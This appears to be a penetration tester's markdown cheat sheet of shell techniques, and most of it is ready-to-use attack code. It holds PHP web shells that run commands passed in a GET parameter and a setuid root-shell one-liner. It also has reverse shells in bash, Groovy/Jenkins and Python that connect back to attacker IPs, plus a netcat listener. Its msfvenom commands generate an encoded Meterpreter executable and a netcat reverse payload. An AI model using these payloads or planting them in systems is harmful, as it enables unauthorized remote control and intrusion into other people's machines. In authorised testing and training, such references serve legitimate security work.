# Shells

## Stabilisation/Upgrade shell

### Python

```console
Step 1
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python2 -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Step 2
$ export TERM=xterm

Step 3
STRG + Z to Backround shell
$ stty raw -echo; fg

Optional Setp 4:
$ reset
```

## Web Shell PHP

### POC
If you are unsure whether they are enabled on your system, the following will return a list of the dangerous functions that are enabled.
```php
<?php print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));?>
```

### Backtrick

```php
<?php system($_GET['cmd']);?>
'cmd' HTTP Request GET parameter -> e.g. "/shell.php?cmd=ls%20-la" 

<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
```

### system()
```php
// Return the listing of the directory where the file runs (Windows)
<?php system("dir"); ?>

// Return the listing of the directory where the file runs (Linux)
<?php system("ls -la"); ?>
```

### exec()

```php
// Executes but returns nothing
<?php exec("ls -la"); ?>

// Executes, returns only last line of the output
<?php echo exec("ls -la"); ?>
```

### shell_exec()

```php
// Executes, returns the entire output as a string
<?php echo shell_exec("ls -la"); ?>
```

### passthru()

```php
// Executes, returns output in raw format
<?php passsthru("ls -la"); ?>
```

## Shells

### Python

```console
$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Reverse Shells

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Listener

```console
nc -lvnp 9001

socat TCP-L:<port>
```

### Bash

```console
bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
```

### Groovy/Jenkins

```
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Python

```console
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.20.70",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## msfvenom

Payload Generator

### Windows Meterpreter Reverse shell

```console
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly.
```

### Reverse nc

```console
$ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
```